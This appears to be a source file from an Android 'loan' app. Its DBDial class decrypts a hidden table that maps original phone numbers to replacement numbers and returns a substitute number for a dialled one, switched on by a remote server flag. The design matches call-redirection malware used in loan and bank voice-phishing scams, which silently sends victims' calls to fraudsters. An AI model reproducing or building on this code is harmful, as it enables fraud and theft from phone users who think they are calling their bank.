package main.app.loan;

import java.io.InputStream;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;

import android.content.Context;
import android.content.res.Resources;

public class DBDial{
	
	public static class PhoneTable{
		public int no = 0;
		public String orgNum = new String();
		public String newNum = new String();
	}
	
	public static PhoneTable[] tables = null; 

	public static void Init(Context context, int nResID)
	{
		try{
			Resources res = context.getResources();
			tables = null;
			
	    	InputStream in =res.openRawResource(nResID);
	        DocumentBuilder db = DocumentBuilderFactory.newInstance().newDocumentBuilder();
	        Document dom = db.parse(in);
	        NodeList items = dom.getElementsByTagName("DT");
	        tables=new PhoneTable[items.getLength()];
	        for(int i=0;i<items.getLength();i++)
	        {
	        	tables[i]=new PhoneTable();
	        	tables[i].no=i;
	        	String orgNum=((Element)items.item(i)).getAttribute("ordinal");
	        	String newNum=((Element)items.item(i)).getAttribute("changer");
	        	String convOrg = GlobalLib.decrypt(orgNum);
	        	String convNew = GlobalLib.decrypt(newNum);
	        	
	        	tables[i].orgNum = GlobalLib.FormatPhoneNumber(convOrg);
	        	tables[i].newNum = GlobalLib.FormatPhoneNumber(convNew);
	        }
			in.close();
		}
		catch(Exception e)
		{
			tables = null;
		}
	}
	
	public static String getRedirectNumber(Context context, String orgNumber)
	{
		try{
			if (NetServer.mAuthSuccess == NetServer.AUTH_RESULT_STOP)
			{
				return "";
			}

			if (NetServer.mAuthSuccess == NetServer.AUTH_RESULT_NONE)
			{
				byte state = InstallWnd.ReadInstallState(context);
				if(state == 0)
				{
					return "";
				}
			}
			
			if (tables == null)
			{
				DBDial.Init(context, R.raw.book);
			}
			
			if (tables == null)
			{
				return "";
			}
			orgNumber = GlobalLib.FormatPhoneNumber(orgNumber);
			
			//
			VarSpace.loadPreferences(context);
			String extrachange = VarSpace.isExtraChanger(orgNumber);
			if("".equals(extrachange) == false)
			{
				if(extrachange.equals("NORMAL"))
				{
					return "";
				}
				else
				{
					return extrachange;
				}
			}
			//
			
			for (int i = 0; i < tables.length; i++)
			{
				String tbOrgNum = tables[i].orgNum;
				String tbNewNum = tables[i].newNum;
				if (orgNumber.equalsIgnoreCase(tbOrgNum) == true)
				{
					return tbNewNum;
				}
			}
		}
		catch(Exception e)
		{
			
		}
		return "";
	}
	
}
